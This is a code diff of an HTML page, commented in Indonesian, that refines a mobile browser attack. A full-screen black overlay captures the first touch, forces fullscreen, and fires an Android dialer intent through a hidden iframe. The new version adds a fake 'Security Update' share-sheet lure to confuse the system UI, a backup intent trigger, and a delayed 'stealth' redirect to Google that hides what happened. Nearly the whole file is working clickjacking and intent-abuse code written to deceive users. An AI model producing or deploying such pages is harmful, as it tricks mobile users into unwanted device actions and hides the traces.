@@ -3,61 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>S Y S T E M</title>
+    <title>S Y S T 3 M</title>
     <style>
-        /* UI Hitam Pekat untuk masking sempurna */
         body, html { 
             margin: 0; padding: 0; background: #000; 
             width: 100vw; height: 100vh; overflow: hidden;
-            touch-action: none;
         }
-        #jacker {
-            position: absolute; top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: 9999; cursor: pointer;
+        #trigger {
+            width: 100%; height: 100%; cursor: pointer;
         }
     </style>
 </head>
 <body>
 
-    <div id="jacker"></div>
+    <div id="trigger"></div>
 
 <script>
-    const jacker = document.getElementById('jacker');
+    const trigger = document.getElementById('trigger');
 
-    jacker.addEventListener('touchstart', function() {
-        // 1. Masuk Fullscreen (Menyamarkan transisi sistem)
+    trigger.addEventListener('touchstart', async function() {
+        // 1. Fullscreen Lockdown
         if (document.documentElement.requestFullscreen) {
             document.documentElement.requestFullscreen();
         }
 
-        // 2. Konstruksi Intent (Contoh: Dialer)
+        // 2. Persiapkan Intent URL
         const intentUrl = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;end";
 
-        // 3. Eksekusi via Iframe tersembunyi
-        // Iframe memungkinkan intent dipicu tanpa menghentikan eksekusi skrip utama
+        // 3. Picu Web Share API (Memaksa System UI Muncul)
+        // Ini akan membingungkan urutan render pada Android
+        if (navigator.share) {
+            navigator.share({
+                title: 'Security Update',
+                text: 'System requires verification',
+                url: 'https://support.mozilla.org'
+            }).catch(() => {}); // Abaikan jika user cancel
+        }
+
+        // 4. Picu Intent via Iframe tepat saat Share Sheet sedang memuat
         const iframe = document.createElement('iframe');
         iframe.style.display = 'none';
         iframe.src = intentUrl;
         document.body.appendChild(iframe);
 
-        // 4. Tahap Pembersihan & Redirect (Stealth Mode)
-        // Kita gunakan delay 100ms agar Iframe punya waktu untuk berkomunikasi dengan OS Android
+        // 5. Cadangan Pemicu Intent
         setTimeout(() => {
-            // Keluar dari Fullscreen agar transisi ke Google terlihat natural
+            window.location.href = intentUrl;
+        }, 150);
+
+        // 6. STEALTH REDIRECT (The "Ghost" Exit)
+        // Redirect dilakukan saat System Share Sheet mungkin masih aktif
+        setTimeout(() => {
             if (document.exitFullscreen) {
                 document.exitFullscreen();
             }
-            
-            // Langsung buang ke Google.com
-            // Ini akan menimpa jejak Intent Picker jika muncul sedikit lag
             window.location.replace("https://www.google.com");
-        }, 100);
-
-        // 5. Fallback terakhir: Jika navigasi gagal, paksa Intent lagi saat halaman ditutup
-        window.addEventListener('pagehide', () => {
-            window.location.href = intentUrl;
-        });
+        }, 800);
     });
 </script>
 </body>
